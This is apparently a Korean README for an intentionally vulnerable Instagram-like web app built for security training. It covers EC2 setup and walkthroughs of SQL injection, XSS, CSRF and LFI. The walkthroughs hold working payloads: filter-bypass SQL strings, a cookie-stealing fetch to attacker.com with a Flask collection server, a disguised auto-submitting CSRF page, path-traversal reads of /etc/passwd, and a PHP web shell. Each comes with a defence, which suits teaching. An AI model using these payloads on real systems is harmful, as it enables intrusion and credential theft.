# 🛡️ Vulnerable SNS - 보안 취약점 학습 플랫폼

## 📋 프로젝트 개요

Vulnerable SNS는 사이버 보안 교육을 위해 의도적으로 취약하게 제작된 SNS 플랫폼입니다.
인스타그램과 유사한 UI/UX를 제공하며, SQL Injection, XSS, CSRF, LFI 등 4가지 주요 웹 취약점을 실습할 수 있습니다.

### 🎯 주요 기능
- 👤 **로그인/회원가입** (SQL Injection 취약)
- 📝 **게시물 작성 및 댓글** (XSS 취약)
- 💝 **선물 보내기 및 프로필 수정** (CSRF 취약)
- 📁 **파일 업로드/다운로드** (LFI 취약)

### 🔥 취약점 난이도
**중급 (Intermediate)**
- 기본적인 보안 필터링이 적용되어 있음
- 하지만 다양한 우회 기법으로 공격 가능
- 실제 환경과 유사한 방어 메커니즘 포함

---

## 🚀 AWS EC2 설치 가이드

### 1. AWS EC2 인스턴스 생성

#### 1.1 인스턴스 설정
```
AMI: Ubuntu Server 22.04 LTS (64-bit x86)
인스턴스 타입: t2.medium (2 vCPU, 4GB RAM)
스토리지: 20GB gp3
```

#### 1.2 보안 그룹 설정
```
SSH (22)        - 내 IP
HTTP (80)       - 0.0.0.0/0
HTTPS (443)     - 0.0.0.0/0
MySQL (3306)    - 내 IP (선택)
```

#### 1.3 SSH 접속
```bash
chmod 400 your-key.pem
ssh -i your-key.pem ubuntu@<EC2-Public-IP>
```

---

### 2. LAMP 스택 설치

#### 2.1 시스템 업데이트
```bash
sudo apt update && sudo apt upgrade -y
```

#### 2.2 Apache 설치
```bash
sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2

# 방화벽 설정 (UFW 사용 시)
sudo ufw allow 'Apache Full'
```

#### 2.3 MySQL 설치
```bash
sudo apt install mysql-server -y
sudo systemctl start mysql
sudo systemctl enable mysql

# MySQL 루트 비밀번호 설정
sudo mysql
```

MySQL 프롬프트에서:
```sql
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'vulnerable123';
FLUSH PRIVILEGES;
EXIT;
```

#### 2.4 PHP 설치
```bash
sudo apt install php libapache2-mod-php php-mysql php-cli php-curl php-gd php-mbstring php-xml -y

# Apache 재시작
sudo systemctl restart apache2

# PHP 버전 확인
php -v
```

---

### 3. Vulnerable SNS 설치

#### 3.1 파일 업로드
```bash
# 웹 디렉토리로 이동
cd /var/www/html

# 기존 파일 백업
sudo mv index.html index.html.bak

# GitHub에서 클론하거나 파일 직접 업로드
# 방법 1: GitHub 사용 시
# git clone https://github.com/your-repo/vulnerable-sns.git

# 방법 2: 로컬에서 파일 업로드
# scp -i your-key.pem -r ./vulnerable-sns/www ubuntu@<EC2-IP>:/tmp/
# sudo mv /tmp/www /var/www/html/vulnerable-sns
```

#### 3.2 권한 설정
```bash
# uploads 디렉토리 생성
sudo mkdir -p /var/www/html/vulnerable-sns/www/uploads

# 소유자 변경
sudo chown -R www-data:www-data /var/www/html/vulnerable-sns

# 권한 설정
sudo chmod -R 755 /var/www/html/vulnerable-sns
sudo chmod -R 777 /var/www/html/vulnerable-sns/www/uploads

# Apache 재시작
sudo systemctl restart apache2
```

#### 3.3 데이터베이스 초기화
브라우저에서 접속:
```
http://<EC2-Public-IP>/vulnerable-sns/www/setup.php
```

"설정 완료" 메시지가 나오면 성공!

---

### 4. 서비스 접속

#### 4.1 로그인 페이지
```
http://<EC2-Public-IP>/vulnerable-sns/www/login.php
```

#### 4.2 테스트 계정
```
관리자: admin / admin123 (10,000 포인트)
유저1: alice / alice2024 (500 포인트)
유저2: bob / bobby123 (300 포인트)
유저3: charlie / charlie99 (150 포인트)
```

---

## 🔓 취약점 상세 분석

### 1. SQL Injection (login.php, register.php)

#### 취약한 코드
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($query);
```

#### 공격 방법

**Level 1: 기본 우회 (차단됨)**
```
Username: admin' OR '1'='1
→ ❌ 블랙리스트에 의해 차단
```

**Level 2: 주석 활용 (성공)**
```
Username: admin'--
Password: (아무거나)
→ ✅ 로그인 성공
```

**Level 3: 대소문자 혼합**
```
Username: admin' oR '1'='1
→ ✅ 필터 우회 성공
```

**Level 4: UNION 기반 정보 탈취**
```sql
Username: admin' UniOn SeLeCt null,username,password,email,null FROM users WHERE '1'='1
→ ✅ 모든 사용자 정보 탈취
```

#### Python 자동화 스크립트
```python
import requests

url = "http://<EC2-IP>/vulnerable-sns/www/login.php"

# SQLi 페이로드
payloads = [
    {"username": "admin'--", "password": "test"},
    {"username": "admin' oR '1'='1'--", "password": "test"},
]

for payload in payloads:
    r = requests.post(url, data=payload)
    if 'dashboard' in r.url or '로그아웃' in r.text:
        print(f"[+] 성공: {payload}")
        break
```

#### 방어 방법
```php
// Prepared Statements 사용
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

---

### 2. XSS (Cross-Site Scripting)

#### 취약한 코드
```php
// 게시물 출력 시 필터링 없음
echo $post['content'];
```

#### 공격 방법

**Level 1: 기본 XSS (차단됨)**
```html
<script>alert('XSS')</script>
→ ❌ 블랙리스트에 의해 차단
```

**Level 2: 이벤트 핸들러 활용 (성공)**
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert(document.cookie)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
→ ✅ XSS 성공
```

**Level 3: 쿠키 탈취**
```html
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

#### 쿠키 탈취 서버
```python
# steal_server.py
from flask import Flask, request
app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('c', '')
    print(f"[+] 쿠키 탈취: {cookie}")
    with open('cookies.txt', 'a') as f:
        f.write(f"{cookie}\n")
    return "OK"

app.run(host='0.0.0.0', port=8000)
```

#### 방어 방법
```php
// htmlspecialchars 사용
echo htmlspecialchars($post['content'], ENT_QUOTES, 'UTF-8');

// Content Security Policy 헤더
header("Content-Security-Policy: default-src 'self'");
```

---

### 3. CSRF (Cross-Site Request Forgery)

#### 취약한 코드
```php
// CSRF 토큰 검증 없음
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['send_gift'])) {
    $receiver_id = $_POST['receiver_id'];
    // ... 선물 전송
}
```

#### 공격 방법

**Level 1: GET 요청 공격**
```html
<!-- 피해자가 클릭하면 프로필 변경 -->
<img src="http://<EC2-IP>/vulnerable-sns/www/profile.php?email=hacked@evil.com&full_name=Hacked">
```

**Level 2: 자동 POST 공격**
```html
<!DOCTYPE html>
<html>
<head><title>이벤트 당첨!</title></head>
<body>
    <h1>축하합니다! 경품이 도착했습니다!</h1>

    <form id="csrf" method="POST" action="http://<EC2-IP>/vulnerable-sns/www/profile.php">
        <input type="hidden" name="send_gift" value="1">
        <input type="hidden" name="receiver_id" value="1">
        <input type="hidden" name="gift_type" value="diamond">
        <input type="hidden" name="points" value="5000">
        <input type="hidden" name="message" value="Hacked!">
    </form>

    <script>
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
```

#### 방어 방법
```php
// CSRF 토큰 생성
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// CSRF 토큰 검증
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF 토큰이 유효하지 않습니다.');
}
```

---

### 4. LFI (Local File Inclusion)

#### 취약한 코드
```php
$file_name = $_GET['name'];
$file_path = UPLOAD_DIR . $file_name;
$content = file_get_contents($file_path);
```

#### 공격 방법

**Level 1: 기본 LFI (차단됨)**
```
file.php?name=../../../etc/passwd
→ ❌ 필터에 의해 차단
```

**Level 2: ../ 두 번 사용 (성공)**
```
file.php?name=../../etc/passwd
file.php?name=../../etc/hosts
file.php?name=../config.php
→ ✅ 파일 읽기 성공
```

**Level 3: 절대 경로 사용**
```
file.php?name=/etc/passwd
file.php?name=/var/www/html/vulnerable-sns/www/config.php
→ ✅ DB 정보 탈취
```

**Level 4: 웹쉘 업로드 + RCE**
```php
// shell.php5 내용
<?php system($_GET['cmd']); ?>
```

업로드 후:
```
file.php?name=shell.php5&cmd=whoami
file.php?name=shell.php5&cmd=cat /etc/passwd
file.php?name=shell.php5&cmd=ls -la /var/www/html
```

#### Python 자동화 스크립트
```python
import requests

url = "http://<EC2-IP>/vulnerable-sns/www/file.php"

lfi_payloads = [
    "../../etc/passwd",
    "/etc/passwd",
    "../config.php",
    "/var/log/apache2/access.log",
]

for payload in lfi_payloads:
    r = requests.get(url, params={'name': payload})
    if 'root:' in r.text or 'DB_' in r.text:
        print(f"[+] LFI 성공: {payload}")
        print(r.text[:500])
        break
```

#### 방어 방법
```php
// 화이트리스트 사용
$allowed_files = ['file1.txt', 'file2.jpg'];
if (!in_array($file_name, $allowed_files)) {
    die('허용되지 않은 파일입니다.');
}

// realpath로 경로 검증
$real_path = realpath($file_path);
if (!$real_path || strpos($real_path, UPLOAD_DIR) !== 0) {
    die('잘못된 경로입니다.');
}
```

---

## 📊 데이터베이스 스키마

```sql
-- 사용자 테이블
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(100),
    full_name VARCHAR(100),
    bio TEXT,
    profile_image VARCHAR(255),
    points INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 게시물 테이블
CREATE TABLE posts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    content TEXT NOT NULL,
    image VARCHAR(255),
    likes INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- 댓글 테이블
CREATE TABLE comments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    post_id INT NOT NULL,
    user_id INT NOT NULL,
    content TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (post_id) REFERENCES posts(id) ON DELETE CASCADE,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- 선물 테이블
CREATE TABLE gifts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    sender_id INT NOT NULL,
    receiver_id INT NOT NULL,
    gift_type VARCHAR(50) NOT NULL,
    points INT NOT NULL,
    message TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (receiver_id) REFERENCES users(id) ON DELETE CASCADE
);
```

---

## 🛠️ 문제 해결

### Apache 시작 실패
```bash
# 에러 로그 확인
sudo tail -f /var/log/apache2/error.log

# 설정 테스트
sudo apache2ctl configtest

# 재시작
sudo systemctl restart apache2
```

### MySQL 접속 오류
```bash
# MySQL 상태 확인
sudo systemctl status mysql

# MySQL 재시작
sudo systemctl restart mysql

# 비밀번호 재설정
sudo mysql
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'vulnerable123';
```

### 파일 업로드 실패
```bash
# uploads 디렉토리 권한 확인
ls -la /var/www/html/vulnerable-sns/www/uploads

# 권한 재설정
sudo chmod 777 /var/www/html/vulnerable-sns/www/uploads
```

---

## ⚠️ 보안 경고

**중요: 이 애플리케이션은 교육 목적으로만 사용해야 합니다!**

- ❌ 실제 프로덕션 환경에 절대 배포하지 마세요
- ❌ 실제 사용자 데이터를 저장하지 마세요
- ❌ 공개 인터넷에 장기간 노출하지 마세요
- ✅ 실습 완료 후 EC2 인스턴스를 종료하세요
- ✅ 허가받은 환경에서만 테스트하세요

---

## 📚 참고 자료

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP SQL Injection**: https://owasp.org/www-community/attacks/SQL_Injection
- **OWASP XSS**: https://owasp.org/www-community/attacks/xss/
- **OWASP CSRF**: https://owasp.org/www-community/attacks/csrf
- **PortSwigger Academy**: https://portswigger.net/web-security
- **HackTheBox**: https://www.hackthebox.com/
- **TryHackMe**: https://tryhackme.com/

---

## 📞 문의 및 지원

이슈 또는 질문이 있으시면 팀원들과 공유하세요!

**Happy Hacking! 🚀**
